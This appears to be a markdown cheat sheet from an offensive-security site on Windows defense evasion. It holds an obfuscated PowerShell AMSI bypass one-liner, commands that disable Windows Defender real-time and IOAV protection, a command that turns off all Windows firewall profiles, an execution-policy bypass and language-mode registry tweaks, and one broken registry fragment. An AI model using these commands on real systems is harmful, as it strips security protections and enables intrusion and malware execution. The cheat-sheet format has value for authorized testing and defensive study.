---
layout: post
title: evasion / win
category: 03-evasion
parent: cheatsheets
modified_date: 2023-03-16
permalink: evasion/win
---

**Mitre Att&ck Entreprise**: [TA0005 - Defense Evasion](https://attack.mitre.org/tactics/TA0005/)

**Menu**
<!-- vscode-markdown-toc -->
* [amsi](#amsi)
* [applocker](#applocker)
* [edr](#edr)
* [powershell](#powershell)
* [windows-defender](#windows-defender)
* [windows-firewall](#windows-firewall)
* [S3cur3Th1sSh1t](#S3cur3Th1sSh1t)

<!-- vscode-markdown-toc-config
	numbering=false
	autoSave=true
	/vscode-markdown-toc-config -->
<!-- /vscode-markdown-toc -->

**Tools**

<script src="https://code.jquery.com/jquery-1.9.1.min.js"></script>
<script>$(window).load(function() {var repos = ["https://api.github.com/repos/TheWover/DInvoke","https://api.github.com/repos/anonymous300502/Nuke-AMSI"]; for (rep in repos) {$.ajax({type: "GET", url: repos[rep], dataType: "json", success: function(result) {$("#repo_list").append("<tr><td><a href='" + result.html_url + "' target='_blank'>" + result.name + "</a></td><td>" + result.pushed_at + "</td><td>" + result.stargazers_count + "</td><td>" + result.subscribers_count + "</td><td>" + result.language + "</td></tr>"); console.log(result);}});}console.log(result);});</script>

<link href="/sortable.css" rel="stylesheet" />
<script src="/sortable.js"></script>
<div id="repos">
    <table id="repo_list" class="sortable">
      <tr><th>_repo</th><th>_last_push</th><th>_stars</th><th>_watch</th><th>_language</th></tr>
    </table>
</div>

## <a name='amsi'></a>amsi 
```powershell
# https://0x00-0x00.github.io/research/2018/10/28/How-to-bypass-AMSI-and-Execute-ANY-malicious-powershell-code.html
sET-ItEM ( 'V'+'aR' +  'IA' + 'blE:1q2'  + 'uZx'  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    GeT-VariaBle  ( "1Q2U"  +"zX"  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System'  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f'amsi','d','InitFaile'  ),(  "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
 ```

 -[nuke-amsi](https://github.com/anonymous300502/Nuke-AMSI)

## <a name='applocker'></a>applocker
```powershell
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
```
## <a name='edr'></a>edr

* [dinvoke](https://hack.technoherder.com/dinvoke/)
* [palo cortex xdr](/edr/defeva#win-xdr)
* [windows defender](/edr/defeva#win-defender)

## <a name='powershell'></a>powershell
```powershell
# powershell execution protection bypass
powershell -ep bypass

# powershell fullLanguage / Constrained language mode
# https://seyptoo.github.io/clm-applocker/
$Env:__PSLockdownPolicy
reg query "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\Environment" /v __PSLockdownPolicy
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\Environment" /v __PSLockdownPolicy /t REG_SZ /d ConstrainedLanguage /f
/v fDenyTSConnections /t REG_DWORD /d 1 /f
$ExecutionContext.SessionState.LanguageMode
$ExecutionContext.SessionState.LanguageMode ConstrainedLanguage
```

## <a name='windows-defender'></a>windows-defender
```powershell
# Windows Defender disabling features
Set-MpPreference -DisableRealtimeMonitoring $true -Verbose
Set-MpPreference -DisableIOAVProtection $true
```

## <a name='windows-firewall'></a>windows-firewall
```powershell
# windows firewall showing / disabling config 
netsh advfirewall set allprofiles state off
netsh advfirewall show allprofiles
```

## <a name='S3cur3Th1sSh1t'></a>S3cur3Th1sSh1t
<iframe width="727" height="409" src="https://www.youtube.com/embed/_sPM9Er_194" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
